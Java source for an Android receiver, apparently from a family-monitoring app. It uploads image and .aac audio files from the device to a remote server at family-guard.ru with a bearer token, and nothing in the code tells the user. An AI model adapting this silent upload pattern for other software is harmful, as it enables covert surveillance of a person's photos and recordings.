package com.inet.android.request;

import java.io.File;
import java.io.FileNotFoundException;

import org.apache.http.Header;
import org.apache.http.message.BasicHeader;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.util.Log;

import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

/**
 * Class for sending file requests receiving via broadcast.
 * 
 * @author johny homicide
 *
 */
public class FileRequestReceiver extends BroadcastReceiver {
	private final String LOG_TAG = FileRequestReceiver.class.getSimpleName()
			.toString();
	private static String lastPath = "";
	private static final String TYPE = "type";
	private static final int ID_ACTION_SEND = 1;
	private static final int ID_ACTION_NOSEND = 0;

	private static AsyncHttpClient client = new AsyncHttpClient();
	private static String URL = "http://family-guard.ru/api/informative";

	@Override
	public void onReceive(Context context, Intent intent) {
		int type = intent.getIntExtra(TYPE, ID_ACTION_NOSEND);
		switch (type) {
		case ID_ACTION_SEND:
			Log.d(LOG_TAG, "ID_ACTION_SEND");
			String path = intent.getStringExtra("path");
			SharedPreferences sp = PreferenceManager
					.getDefaultSharedPreferences(context);
			String image = sp.getString("image", "0");
			String audio = sp.getString("audio", "0");
			Log.d(LOG_TAG, "path = " + path);
			if(!getLastFile().equals(path)){
				setLastFile(path);
			}else
				return;
			String typeValue = "";
			if (path.endsWith(".jpg") || path.endsWith(".png")
					|| path.endsWith(".gif") || path.endsWith(".bpm")
					&& image.equals("1")) {
				typeValue = "21";
				Logging.doLog(LOG_TAG, "data[image]", "data[image]");
			}
			if (path.endsWith(".aac") && audio.equals("1")) {
				typeValue = "22";
				Logging.doLog(LOG_TAG, "data[audio]", "data[audio]");
			}
			if (typeValue.equals(""))
				return;
			RequestParams params = new RequestParams();
			try {
				params.put("data[][time]", ConvertDate.logTime());
				params.put("data[][type]", typeValue);
				params.put("data[][path]", path);
				params.put("key", System.currentTimeMillis());
				params.put("data[][file]", new File(path));

				Logging.doLog(LOG_TAG, "params " + params.toString(), "params "
						+ params.toString());

			} catch (FileNotFoundException e) {
				Log.d(LOG_TAG, "FileNotFoundException");
				e.printStackTrace();
			}

			String token = sp.getString("access_second_token", "");
			final Header[] headers = {
					new BasicHeader("Accept", "application/json"),
					// new BasicHeader(HTTP.CONTENT_TYPE, "application/json"),
					new BasicHeader("Authorization", "Bearer " + token) };

			client.post(context, URL, headers, params, null,
					new AsyncHttpResponseHandler() {
						@Override
						public void onStart() {
							// called before request is started
							Logging.doLog(LOG_TAG, "onStart. StartCode",
									"onStart. StartCode");
						}

						@Override
						public void onSuccess(int arg0, Header[] arg1,
								byte[] arg2) {
							Logging.doLog(LOG_TAG, "onSuccess. StatusCode: "
									+ arg0 + arg1 + arg2,
									"onSuccess. StatusCode");
						}

						@Override
						public void onFailure(int arg0, Header[] arg1,
								byte[] arg2, Throwable arg3) {
							Logging.doLog(LOG_TAG, "onFailru. StatusCode"
									+ arg0, "onFailru. StatusCode" + arg0);
						}
					});

			break;
		}
	}

	private static void setLastFile(String path) {
		lastPath = path;
	}

	private static String getLastFile() {
		return lastPath;
	}
}
